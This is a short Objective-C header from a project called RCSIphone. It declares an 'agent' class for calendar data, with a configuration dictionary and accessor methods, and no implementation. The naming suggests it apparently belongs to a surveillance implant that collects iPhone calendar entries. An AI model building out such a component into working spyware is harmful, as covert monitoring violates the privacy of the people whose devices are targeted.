//
//  RCSIAgentCalendar.h
//  RCSIphone
//
//  Created by kiodo on 04/08/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface RCSIAgentCalendar : NSObject
{
@public
  NSMutableDictionary *mAgentConfiguration;
  long                mLastEvent;
}

+ (RCSIAgentCalendar *)sharedInstance;

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;

@end
